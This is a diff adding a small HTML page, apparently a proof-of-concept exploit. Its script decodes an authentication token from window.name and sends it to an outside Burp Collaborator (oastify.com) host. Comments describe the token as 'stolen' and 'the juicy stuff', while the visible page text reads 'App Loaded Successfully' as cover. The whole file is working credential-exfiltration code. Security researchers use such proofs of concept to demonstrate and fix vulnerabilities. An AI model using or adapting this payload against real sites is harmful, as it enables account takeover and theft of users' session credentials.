@@ -1,0 +1,17 @@
+<html>
+<body>
+  <script>
+    try {
+      // Grab the juicy stuff from window.name
+      const metadata = JSON.parse(atob(window.name));
+      const token = metadata.props.context.environment.authToken;
+
+      // Send it straight to your Burp Collab
+      fetch("https://srnboyarclwnk0w6kp055kvdb4hy5otd.oastify.com/?stolen=" + token);
+    } catch(e) {
+      console.error("Failed to grab token", e);
+    }
+  </script>
+  <p>App Loaded Successfully</p>
+</body>
+</html>
